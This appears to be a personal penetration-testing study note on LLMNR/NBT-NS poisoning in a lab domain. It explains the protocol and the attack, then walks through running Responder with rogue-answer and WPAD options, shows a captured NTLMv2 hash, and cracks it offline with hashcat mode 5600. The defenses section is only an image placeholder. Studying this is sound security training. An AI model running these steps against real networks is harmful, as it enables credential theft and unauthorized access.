### What is LLMNR
![[Pasted image 20210722094731.png]]

The Link-Local Multicast Name Resolution (LLMNR) is a protocol based on the Domain Name System (DNS) packet format that allows both IPv4 and IPv6 hosts to perform name resolution for hosts on the same local link

### What is LLMNR Poisoning
![[Pasted image 20210722094852.png]]

Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it

### How to perform

First start responder in the attacker machine with the following command
```bash
responder -I eth0 -rdwv
```

| Commands | Use |  
| ----------- | ----------- |  
| -I | Interface  |  
| -r | Enable answers for netbios wredir suffix queries |
| -d | Enable answers for netbios domain suffix queries |
| -w | Start the WPAD rogue proxy server |
| -v | Increase verbosity |

![[Pasted image 20210722100753.png]]

Now if a victim mistype the IP and try to connect to attacker machine the NTLMv2 hashes will be captured

![[Pasted image 20210722100953.png]]
![[Pasted image 20210722100919.png]]

Now see the responder results

![[Pasted image 20210722101051.png]]

### Cracking the Passwords

We will use hashcat to crack the password
```bash
fcastle::MARVEL:555b79d791189a40:CC79802FBCE6CFA5827D4496F02D42ED:010100000000000080ECE79A907ED7011ADDF15B152BA0D90000000002000800480056004400580001001E00570049004E002D0033005A0058004400590038003800430049004D00450004003400570049004E002D0033005A0058004400590038003800430049004D0045002E0048005600440058002E004C004F00430041004C000300140048005600440058002E004C004F00430041004C000500140048005600440058002E004C004F00430041004C000700080080ECE79A907ED70106000400020000000800300030000000000000000100000000200000449D2DF704A98B14EDC0535355A568FA8E9C6E2D88219A2447C5159A8826BDDD0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003200340037002E003100340032000000000000000000
```

Copy the above hash in a txt file. This is the NTLMv2 hash , so we have to get the mode of NTLMv2 from hashcat. To do so type the following command

```bash
hashcat --help | grep NTLM
```

![[Pasted image 20210722102418.png]]

We will use NTLMv2, use the following syntaxt to crack
```bash
hashcat -m 5600 <hash file> <wordlist>
```

![[Pasted image 20210722102535.png]]

### Defenses against LLMNR Poisoning
![[Pasted image 20210722102923.png]]